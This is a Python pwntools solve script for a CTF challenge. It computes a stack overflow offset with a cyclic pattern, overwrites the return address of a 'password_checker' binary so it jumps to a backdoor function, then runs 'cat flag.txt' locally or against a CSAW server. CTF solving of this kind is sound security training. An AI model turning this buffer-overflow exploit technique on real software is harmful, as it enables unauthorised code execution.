#!/usr/bin/env python3

"""
WhatTheFuzz's submission for the <CTF> challenge '<name>.

This script can be used in the following manner:
python3 ./solve.py <REMOTE/LOCAL>

Args:
    param1: LOCAL will operate locally on the user's machine.
            REMOTE will connect to the CTF webserver and grab the flag.
            If no parameter is specified, the program will default to LOCAL.

Returns:
    The flag to solve the challenge.
"""

from pwn import *

exe = ELF("./password_checker")

context.binary = exe
context.log_level = 'info'

NUM_CYCLIC_BYTES = 100
BANNER = b'Enter the password to get in:'

def find_offset_to_return_address():
    '''Generate a cyclic pattern that we will write onto the stack. We will
    then examine the faulting address and see where it occurs in the pattern.
    Returns the index of this position.
    '''

    # Generate a cyclic pattern so that we can auto-find the offset.
    payload = cyclic(NUM_CYCLIC_BYTES)

    # Run the process to it crashes.
    proc = process([exe.path])

    # Send our pattern
    proc.sendlineafter(BANNER, payload)
    proc.wait()

    # Get the coredump.
    core = proc.corefile

    # The faulting address should be some subset of bytes inside our cyclic
    # pattern.
    # `pwn.pack` will convert the hexadecimal bytes of the address to a string,
    # which is the data structure used for our cyclic pattern.
    assert pack(core.fault_addr) in payload, "Faulting address not in the \
                                                cyclic pattern."

    # Find our offset.
    offset = cyclic_find(pack(core.fault_addr), n=4)

    return offset

def conn():
    '''Establish the connection to the process, local or remote.
    '''

    if args.get('REMOTE'):
        r = remote('pwn.chal.csaw.io', 5000)

    else:
        r = process([exe.path])

    return r

def main():
    '''Return the flag.
    '''

    r = conn()

    # Get the offset to the return address.
    offset = find_offset_to_return_address()
    log.info(f'The offset to the return address is: {offset}.')

    # Create our payload which will set the return address to our backdoor.
    backdoor = exe.symbols['backdoor']
    log.info(f'The address of the backdoor function is: {hex(backdoor)}.')
    payload = fit(
        {
            offset: p32(backdoor)
        }
    )

    # Send it!
    r.sendlineafter(BANNER, payload)

    # Grab the flag.
    r.sendline(b'cat flag.txt')
    flag = r.recvline_containsS('flag')

    # Parse the flag.
    flag = flag[flag.find('flag'):]
    log.success(flag)
    return flag


if __name__ == "__main__":
    main()
